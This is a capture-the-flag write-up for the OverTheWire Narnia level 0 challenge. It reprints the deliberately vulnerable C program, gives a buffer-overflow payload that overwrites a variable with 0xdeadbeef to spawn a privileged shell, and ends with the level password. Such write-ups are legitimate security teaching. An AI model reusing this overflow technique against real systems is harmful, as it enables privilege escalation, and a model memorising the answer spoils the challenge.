# Level 0

```c++
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

```python
python -c "print('B'*19)" | ./narnia0 
```
overwrites the last byte to 00. Null byte? Therefor we need to reverse `deadbeef`?
```python
python -c "print('deadbeef'[::-1])"
# output
feebdaed
```

```python
(python -c 'print(b"A"*20 + "\xef\xbe\xad\xde")'; cat;) | ./narnia0
```

# Password: efeidiedae
